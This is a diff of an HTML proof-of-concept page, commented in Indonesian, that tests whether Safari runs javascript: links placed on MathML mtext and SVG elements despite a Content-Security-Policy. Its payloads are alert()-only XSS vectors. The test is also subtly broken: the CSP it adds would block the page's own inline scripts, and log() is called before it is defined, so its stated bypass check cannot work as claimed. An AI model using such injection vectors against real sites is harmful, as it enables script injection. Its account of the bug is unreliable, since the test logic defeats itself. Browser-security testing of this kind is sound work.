@@ -1,35 +1,30 @@
 <!DOCTYPE html>
 <html>
+<head><meta http-equiv="Content-Security-Policy" content="script-src 'self'"></head>
 <body>
-<h2>MathML XSS Test - Safari Only</h2>
-<pre id="log"></pre>
+<h2>Safari CSP Bypass Test - Harusnya di-block</h2>
+<p>Kalau alert muncul padahal CSP script-src 'self' = BUG Safari</p>
+
 <div id="test"></div>
+
 <script>
-let log = m=>document.getElementById('log').textContent+=m+"\n";
+// Ini di Chrome akan di-block CSP, di Safari lama lolos
+document.getElementById('test').innerHTML = `
+<math>
+  <mtext href="javascript:alert('Safari CSP Bypass: '+document.domain)">CLICK - CSP BYPASS?</mtext>
+</math>
+<br>
+<svg><a href="javascript:alert(2)"><text x=20 y=20>SVG</text></a></svg>
+`;
 
-// Test 1: MathML + href javascript:
-try{
-  let div = document.getElementById('test');
-  div.innerHTML = `<math><mtext href="javascript:alert(document.domain)">CLICK ME - Safari XSS</mtext></math>`;
-  log("MathML with javascript: href injected");
-  log("Tap tulisan CLICK ME di atas, kalau alert muncul = XSS BUG");
-}catch(e){ log("MathML error: "+e) }
+log("CSP: script-src 'self'");
+log("Kalau di Chrome: alert di-block CSP");
+log("Kalau di Safari: alert muncul = BUG SAFARI CSP BYPASS");
+</script>
 
-// Test 2: SVG + animate + href (Safari bypass)
-try{
-  let div2 = document.createElement('div');
-  div2.innerHTML = `<svg><a href="javascript:alert(2)"><text x="20" y="20">SVG JS LINK</text></a></svg>`;
-  document.body.appendChild(div2);
-  log("SVG javascript: injected, tap SVG JS LINK");
-}catch(e){ log("SVG error: "+e) }
-
-// Test 3: form + math + action javascript:
-try{
-  let div3 = document.createElement('div');
-  div3.innerHTML = `<math><mtext><form action="javascript:alert(3)"><input type=submit value="FORM JS"></form></mtext></math>`;
-  document.body.appendChild(div3);
-  log("Form javascript: in MathML injected");
-}catch(e){}
+<pre id="log"></pre>
+<script>
+function log(m){document.getElementById('log').textContent+=m+"\n"}
 </script>
 </body>
 </html>
